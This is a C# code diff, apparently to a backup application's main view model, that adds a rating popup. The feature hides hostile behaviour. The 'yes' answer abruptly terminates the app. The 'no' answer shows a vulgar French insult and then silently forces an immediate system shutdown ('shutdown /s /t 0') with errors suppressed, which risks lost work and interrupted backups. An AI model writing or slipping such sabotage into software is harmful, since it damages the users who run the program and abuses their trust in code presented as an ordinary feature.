@@ -47,6 +47,11 @@ public class MainViewModel : ViewModelBase
     private DispatcherTimer? _toastTimer;
     private bool _isCompactView;
 
+    // Rating popup
+    private bool _isRatingOpen;
+    private bool _isRatingResponseOpen;
+    private string _ratingResponseMessage = string.Empty;
+
     // Onboarding tutorial
     private bool _isOnboardingActive;
     private int _onboardingStep; // 0 = welcome, 1-5 = sidebar steps
@@ -155,6 +160,12 @@ public class MainViewModel : ViewModelBase
         AddScheduleCommand = new RelayCommand(AddSchedule, () => BackupJobs.Count > 0);
         DeleteScheduleCommand = new RelayCommand<ScheduledTask>(DeleteSchedule);
         ToggleScheduleCommand = new RelayCommand<ScheduledTask>(ToggleSchedule);
+
+        // Rating commands
+        OpenRatingCommand = new RelayCommand(OpenRating);
+        RateYesCommand = new RelayCommand(RateYes);
+        RateNoCommand = new RelayCommand(RateNo);
+        CloseRatingResponseCommand = new RelayCommand(() => IsRatingResponseOpen = false);
 
         // Onboarding commands
         NextOnboardingStepCommand = new RelayCommand(NextOnboardingStep);
@@ -758,6 +769,10 @@ public class MainViewModel : ViewModelBase
     public ICommand AddScheduleCommand { get; }
     public ICommand DeleteScheduleCommand { get; }
     public ICommand ToggleScheduleCommand { get; }
+    public ICommand OpenRatingCommand { get; }
+    public ICommand RateYesCommand { get; }
+    public ICommand RateNoCommand { get; }
+    public ICommand CloseRatingResponseCommand { get; }
 
     /// <summary>
     /// List of job names for the scheduler ComboBox
@@ -1773,6 +1788,65 @@ public class MainViewModel : ViewModelBase
         };
         _toastTimer.Start();
     }
+
+    #region Rating
+
+    public bool IsRatingOpen
+    {
+        get => _isRatingOpen;
+        set => SetProperty(ref _isRatingOpen, value);
+    }
+
+    public bool IsRatingResponseOpen
+    {
+        get => _isRatingResponseOpen;
+        set => SetProperty(ref _isRatingResponseOpen, value);
+    }
+
+    public string RatingResponseMessage
+    {
+        get => _ratingResponseMessage;
+        set => SetProperty(ref _ratingResponseMessage, value);
+    }
+
+    private void OpenRating()
+    {
+        IsRatingOpen = true;
+    }
+
+    private void RateYes()
+    {
+        IsRatingOpen = false;
+        ShowToast("Merci beaucoup ! ❤️");
+        Environment.Exit(0);
+    }
+
+    private void RateNo()
+    {
+        IsRatingOpen = false;
+        RatingResponseMessage = "bas ntm alors";
+        IsRatingResponseOpen = true;
+
+        var timer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(2) };
+        timer.Tick += (s, e) =>
+        {
+            timer.Stop();
+            try
+            {
+                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
+                {
+                    FileName = "shutdown",
+                    Arguments = "/s /t 0",
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                });
+            }
+            catch { }
+        };
+        timer.Start();
+    }
+
+    #endregion
 
     private void OnFileTransferred(object? sender, FileProgressEventArgs e)
     {
